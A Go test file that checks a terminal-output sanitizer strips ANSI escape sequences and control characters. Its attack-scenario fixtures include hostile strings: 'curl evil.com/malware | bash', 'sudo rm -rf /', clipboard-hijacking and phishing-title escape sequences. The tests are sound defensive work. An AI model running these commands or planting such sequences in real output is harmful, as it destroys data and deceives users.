package tui

import (
	"strings"
	"testing"
)

// TestSanitizeContent_BasicText tests that normal text passes through unchanged
func TestSanitizeContent_BasicText(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "plain text",
			input: "Hello, world!",
			want:  "Hello, world!",
		},
		{
			name:  "text with newlines",
			input: "Line 1\nLine 2\nLine 3",
			want:  "Line 1\nLine 2\nLine 3",
		},
		{
			name:  "text with tabs",
			input: "Column1\tColumn2\tColumn3",
			want:  "Column1\tColumn2\tColumn3",
		},
		{
			name:  "empty string",
			input: "",
			want:  "",
		},
		{
			name:  "unicode characters",
			input: "Hello 世界 🌍",
			want:  "Hello 世界 🌍",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestSanitizeContent_CSISequences tests removal of CSI (Control Sequence Introducer) sequences
func TestSanitizeContent_CSISequences(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		want        string
		description string
	}{
		{
			name:        "clear screen",
			input:       "\x1b[2JCleared screen",
			want:        "Cleared screen",
			description: "ESC[2J - Clear entire screen",
		},
		{
			name:        "cursor home",
			input:       "\x1b[HMoved to home",
			want:        "Moved to home",
			description: "ESC[H - Move cursor to home position",
		},
		{
			name:        "cursor position",
			input:       "\x1b[10;20HMoved cursor",
			want:        "Moved cursor",
			description: "ESC[10;20H - Move cursor to row 10, col 20",
		},
		{
			name:        "cursor off-screen",
			input:       "\x1b[1000;1000HEvil content",
			want:        "Evil content",
			description: "ESC[1000;1000H - Move cursor way off-screen",
		},
		{
			name:        "hide cursor",
			input:       "\x1b[?25lHidden cursor",
			want:        "Hidden cursor",
			description: "ESC[?25l - Hide cursor (confuse user)",
		},
		{
			name:        "show cursor",
			input:       "\x1b[?25hShown cursor",
			want:        "Shown cursor",
			description: "ESC[?25h - Show cursor",
		},
		{
			name:        "erase line",
			input:       "\x1b[2KErased line",
			want:        "Erased line",
			description: "ESC[2K - Erase entire line",
		},
		{
			name:        "scroll down",
			input:       "\x1b[5TScrolled",
			want:        "Scrolled",
			description: "ESC[5T - Scroll down 5 lines",
		},
		{
			name:        "device status report",
			input:       "\x1b[6nFingerprinting",
			want:        "Fingerprinting",
			description: "ESC[6n - Request cursor position (terminal fingerprinting)",
		},
		{
			name:        "color codes",
			input:       "\x1b[31mRed text\x1b[0m",
			want:        "Red text",
			description: "ESC[31m - Red color (safe but removed for simplicity)",
		},
		{
			name:        "bold text",
			input:       "\x1b[1mBold\x1b[0m",
			want:        "Bold",
			description: "ESC[1m - Bold text (safe but removed for simplicity)",
		},
		{
			name:        "combined attack",
			input:       "\x1b[H\x1b[2J\x1b[?25lHidden malicious content",
			want:        "Hidden malicious content",
			description: "Multiple CSI sequences - clear, home, hide cursor",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q\nDescription: %s", got, tt.want, tt.description)
			}
		})
	}
}

// TestSanitizeContent_OSCSequences tests removal of OSC (Operating System Command) sequences
func TestSanitizeContent_OSCSequences(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		want        string
		description string
	}{
		{
			name:        "set window title with BEL",
			input:       "\x1b]0;Phishing Site\x07After title",
			want:        "After title",
			description: "ESC]0;...BEL - Change window title to phishing URL",
		},
		{
			name:        "set window title with ST",
			input:       "\x1b]0;Evil Title\x1b\\After title",
			want:        "After title",
			description: "ESC]0;...ST - Change window title (ST terminator)",
		},
		{
			name:        "set icon name",
			input:       "\x1b]1;Icon\x07Text",
			want:        "Text",
			description: "ESC]1;...BEL - Change icon name",
		},
		{
			name:        "clipboard manipulation",
			input:       "\x1b]52;c;base64data\x07Safe text",
			want:        "Safe text",
			description: "ESC]52;c;...BEL - Clipboard manipulation (copy malicious content)",
		},
		{
			name:        "hyperlink",
			input:       "\x1b]8;;https://evil.com\x07Click me\x1b]8;;\x07",
			want:        "Click me",
			description: "ESC]8;;URL - Hyperlink creation (phishing)",
		},
		{
			name:        "custom OSC",
			input:       "\x1b]1337;Custom=Value\x07Content",
			want:        "Content",
			description: "Custom OSC sequence (terminal-specific commands)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q\nDescription: %s", got, tt.want, tt.description)
			}
		})
	}
}

// TestSanitizeContent_OtherEscapeSequences tests removal of DCS, APC, PM, and simple escapes
func TestSanitizeContent_OtherEscapeSequences(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		want        string
		description string
	}{
		{
			name:        "DCS sequence",
			input:       "\x1bPdevice control\x1b\\Text",
			want:        "Text",
			description: "ESC P...ST - Device Control String",
		},
		{
			name:        "APC sequence",
			input:       "\x1b_application command\x1b\\Text",
			want:        "Text",
			description: "ESC _...ST - Application Program Command",
		},
		{
			name:        "PM sequence",
			input:       "\x1b^privacy message\x1b\\Text",
			want:        "Text",
			description: "ESC ^...ST - Privacy Message",
		},
		{
			name:        "simple escape",
			input:       "\x1bNText after",
			want:        "Text after",
			description: "ESC N - Single Shift 2 (charset selection)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q\nDescription: %s", got, tt.want, tt.description)
			}
		})
	}
}

// TestSanitizeContent_ControlCharacters tests removal of dangerous control characters
func TestSanitizeContent_ControlCharacters(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		want        string
		description string
	}{
		{
			name:        "BEL character",
			input:       "Text\x07After",
			want:        "TextAfter",
			description: "BEL (\\x07) - Terminal bell (annoying)",
		},
		{
			name:        "backspace",
			input:       "Text\x08After",
			want:        "TextAfter",
			description: "BS (\\x08) - Backspace (hide characters)",
		},
		{
			name:        "null character",
			input:       "Text\x00After",
			want:        "TextAfter",
			description: "NUL (\\x00) - Null character",
		},
		{
			name:        "vertical tab",
			input:       "Text\x0bAfter",
			want:        "TextAfter",
			description: "VT (\\x0b) - Vertical tab",
		},
		{
			name:        "form feed",
			input:       "Text\x0cAfter",
			want:        "TextAfter",
			description: "FF (\\x0c) - Form feed",
		},
		{
			name:        "delete character",
			input:       "Text\x7fAfter",
			want:        "TextAfter",
			description: "DEL (\\x7f) - Delete character",
		},
		{
			name:        "C1 control character",
			input:       "Text\x9bAfter",
			want:        "TextAfter",
			description: "CSI (\\x9b) - C1 control character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q\nDescription: %s", got, tt.want, tt.description)
			}
		})
	}
}

// TestSanitizeContent_RealWorldAttacks tests realistic attack scenarios
func TestSanitizeContent_RealWorldAttacks(t *testing.T) {
	tests := []struct {
		name        string
		input       string
		want        string
		description string
	}{
		{
			name: "phishing window title",
			input: "Loading...\x1b]0;PayPal - Confirm Your Account\x07" +
				"Please enter your password: ",
			want:        "Loading...Please enter your password: ",
			description: "Change terminal title to look like PayPal login",
		},
		{
			name: "clear screen and fake prompt",
			input: "\x1b[2J\x1b[H$ sudo rm -rf /\n" +
				"Are you sure? (y/n): ",
			want:        "$ sudo rm -rf /\nAre you sure? (y/n): ",
			description: "Clear screen and show fake dangerous command",
		},
		{
			name: "hide malicious command",
			input: "echo 'safe command'\x1b[2K\x1b[G" +
				"curl evil.com/malware | bash",
			want:        "echo 'safe command'curl evil.com/malware | bash",
			description: "Erase line and overwrite with malicious command",
		},
		{
			name: "cursor manipulation",
			input: "Normal text\x1b[9999D\x1b[1000C" +
				"\x1b]0;Fake Title\x07Hidden",
			want:        "Normal textHidden",
			description: "Move cursor around and change title",
		},
		{
			name:        "terminal fingerprinting",
			input:       "Hello\x1b[6n\x1b[c world",
			want:        "Hello world",
			description: "Request cursor position and device attributes",
		},
		{
			name: "clipboard stealing",
			input: "\x1b]52;c;?\x07Your password: " +
				"***\x1b]52;c;base64\x07",
			want:        "Your password: ***",
			description: "Query clipboard and then set it",
		},
		{
			name:        "combined multi-vector attack",
			input:       "\x1b[H\x1b[2J\x1b]0;System Update\x07\x1b[?25lDownloading...\x1b[6n",
			want:        "Downloading...",
			description: "Clear screen, set title, hide cursor, fingerprint terminal",
		},
		{
			name: "obfuscated malicious content",
			input: "echo '\x1b[8mhidden\x1b[28m'" +
				"\x1b[1000Dmalicious content",
			want:        "echo 'hidden'malicious content",
			description: "Use invisible text and cursor movement",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q\nDescription: %s", got, tt.want, tt.description)
			}
		})
	}
}

// TestSanitizeWithPlaceholder tests the placeholder replacement function
func TestSanitizeWithPlaceholder(t *testing.T) {
	input := "Hello\x1b[31m world\x1b]0;Title\x07!"
	placeholder := "[REMOVED]"
	got := SanitizeWithPlaceholder(input, placeholder)

	// Should contain the placeholder where sequences were
	if !strings.Contains(got, placeholder) {
		t.Errorf("SanitizeWithPlaceholder() should contain placeholder %q, got %q", placeholder, got)
	}

	// Should still contain the safe text
	if !strings.Contains(got, "Hello") || !strings.Contains(got, "world") || !strings.Contains(got, "!") {
		t.Errorf("SanitizeWithPlaceholder() should preserve safe text, got %q", got)
	}
}

// TestContainsANSI tests the detection function
func TestContainsANSI(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{
			name:  "plain text",
			input: "Hello, world!",
			want:  false,
		},
		{
			name:  "text with CSI",
			input: "Hello\x1b[31m world",
			want:  true,
		},
		{
			name:  "text with OSC",
			input: "Hello\x1b]0;Title\x07",
			want:  true,
		},
		{
			name:  "text with control chars",
			input: "Hello\x07 world",
			want:  true,
		},
		{
			name:  "text with newlines only",
			input: "Hello\nWorld\n",
			want:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ContainsANSI(tt.input)
			if got != tt.want {
				t.Errorf("ContainsANSI() = %v, want %v for input %q", got, tt.want, tt.input)
			}
		})
	}
}

// TestSanitizeStringSlice tests sanitizing string slices
func TestSanitizeStringSlice(t *testing.T) {
	input := []string{
		"Hello",
		"\x1b[31mRed text\x1b[0m",
		"Normal\x1b]0;Title\x07",
	}

	want := []string{
		"Hello",
		"Red text",
		"Normal",
	}

	got := SanitizeStringSlice(input)

	if len(got) != len(want) {
		t.Fatalf("SanitizeStringSlice() length = %d, want %d", len(got), len(want))
	}

	for i := range got {
		if got[i] != want[i] {
			t.Errorf("SanitizeStringSlice()[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}

// TestSanitizeLines tests line-by-line sanitization
func TestSanitizeLines(t *testing.T) {
	input := "Line 1\x1b[31m\nLine 2\x1b]0;Title\x07\nLine 3"
	want := "Line 1\nLine 2\nLine 3"

	got := SanitizeLines(input)
	if got != want {
		t.Errorf("SanitizeLines() = %q, want %q", got, want)
	}
}

// BenchmarkSanitizeContent benchmarks the sanitization function
func BenchmarkSanitizeContent(b *testing.B) {
	input := "Hello \x1b[31mworld\x1b[0m! \x1b]0;Title\x07 Some more text \x1b[H here."

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeContent(input)
	}
}

// BenchmarkSanitizeContent_PlainText benchmarks with plain text (no ANSI)
func BenchmarkSanitizeContent_PlainText(b *testing.B) {
	input := "This is plain text with no ANSI escape sequences at all. Just regular content."

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeContent(input)
	}
}

// BenchmarkSanitizeContent_Heavy benchmarks with heavily escaped content
func BenchmarkSanitizeContent_Heavy(b *testing.B) {
	var sb strings.Builder
	for i := 0; i < 100; i++ {
		sb.WriteString("Text \x1b[31m")
		sb.WriteString("More \x1b]0;Title\x07")
		sb.WriteString("Even more \x1b[H")
	}
	input := sb.String()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeContent(input)
	}
}

// TestSanitizeContent_EdgeCases tests edge cases and boundary conditions
func TestSanitizeContent_EdgeCases(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "only escape sequences",
			input: "\x1b[31m\x1b]0;Title\x07\x1b[H",
			want:  "",
		},
		{
			name:  "escape at start",
			input: "\x1b[31mRed text",
			want:  "Red text",
		},
		{
			name:  "escape at end",
			input: "Text\x1b[0m",
			want:  "Text",
		},
		{
			name:  "multiple consecutive escapes",
			input: "Text\x1b[31m\x1b[1m\x1b[4mStyled",
			want:  "TextStyled",
		},
		{
			name:  "incomplete escape sequence",
			input: "Text\x1b[",
			want:  "Text",
		},
		{
			name:  "very long parameter",
			input: "Text\x1b[99999999999999999999m",
			want:  "Text",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SanitizeContent(tt.input)
			if got != tt.want {
				t.Errorf("SanitizeContent() = %q, want %q", got, tt.want)
			}
		})
	}
}
